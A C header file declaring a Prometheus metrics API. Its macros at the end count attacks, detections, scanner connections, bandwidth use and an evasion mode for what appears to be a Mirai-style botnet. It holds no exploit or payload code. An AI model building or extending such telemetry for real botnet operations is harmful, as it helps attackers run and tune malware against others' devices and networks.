/**
 * @file metrics.h
 * @brief Prometheus metrics collection for monitoring
 */

#ifndef METRICS_H
#define METRICS_H

#include <stdint.h>
#include <stdbool.h>

// Metric types
typedef enum {
    METRIC_COUNTER = 0,
    METRIC_GAUGE,
    METRIC_HISTOGRAM
} metric_type_t;

// Metrics context
typedef struct metrics_context metrics_context_t;

/**
 * Initialize metrics system
 * 
 * @param port HTTP port for Prometheus metrics endpoint
 * @return Context or NULL on error
 */
metrics_context_t *metrics_init(uint16_t port);

/**
 * Increment a counter metric
 * 
 * @param ctx Metrics context
 * @param name Metric name
 * @param labels Labels (can be NULL)
 * @param value Amount to increment
 */
void metrics_counter_inc(metrics_context_t *ctx, const char *name, 
                        const char *labels, double value);

/**
 * Set a gauge metric
 * 
 * @param ctx Metrics context
 * @param name Metric name
 * @param labels Labels (can be NULL)
 * @param value Gauge value
 */
void metrics_gauge_set(metrics_context_t *ctx, const char *name,
                       const char *labels, double value);

/**
 * Observe a histogram value
 * 
 * @param ctx Metrics context
 * @param name Metric name
 * @param labels Labels (can be NULL)
 * @param value Observed value
 */
void metrics_histogram_observe(metrics_context_t *ctx, const char *name,
                               const char *labels, double value);

/**
 * Cleanup metrics system
 */
void metrics_cleanup(metrics_context_t *ctx);

// Convenience macros for common metrics
#define METRIC_ATTACK_SUCCESS(ctx) \
    metrics_counter_inc(ctx, "mirai_bot_successful_attacks_total", NULL, 1.0)

#define METRIC_ATTACK_FAILURE(ctx) \
    metrics_counter_inc(ctx, "mirai_bot_failed_attacks_total", NULL, 1.0)

#define METRIC_DETECTION(ctx, type) \
    metrics_counter_inc(ctx, "mirai_bot_detections_total", "type=\"" type "\"", 1.0)

#define METRIC_ACTIVE_CONNECTIONS(ctx, count) \
    metrics_gauge_set(ctx, "mirai_scanner_active_connections", NULL, (double)(count))

#define METRIC_BANDWIDTH_UTIL(ctx, percent) \
    metrics_gauge_set(ctx, "mirai_bot_bandwidth_utilization_percent", NULL, (double)(percent))

#define METRIC_EVASION_MODE(ctx, active) \
    metrics_gauge_set(ctx, "mirai_bot_evasion_mode", NULL, (active) ? 1.0 : 0.0)

#endif // METRICS_H
